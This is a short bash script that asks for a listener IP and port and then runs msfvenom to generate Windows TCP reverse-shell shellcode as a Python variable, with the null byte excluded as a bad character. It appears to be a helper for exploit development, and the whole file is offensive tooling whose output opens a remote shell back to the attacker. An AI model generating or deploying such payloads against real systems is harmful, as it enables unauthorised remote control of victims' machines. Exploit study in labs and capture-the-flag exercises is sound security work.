#!/bin/bash

#LHOST IP
echo "------------------------------"
echo Your IP for TCP reverse shell:
echo "------------------------------"
read my_ip

#LPORT 
echo "------------------------------"
echo Your port for TCP reverse shell:
echo "------------------------------"
read my_port
# -b here represents badchar
msfvenom -p windows/shell_reverse_tcp lhost=$my_ip lport=$my_port EXITFUNC=thread -f python -v shellcode -b "\x00"
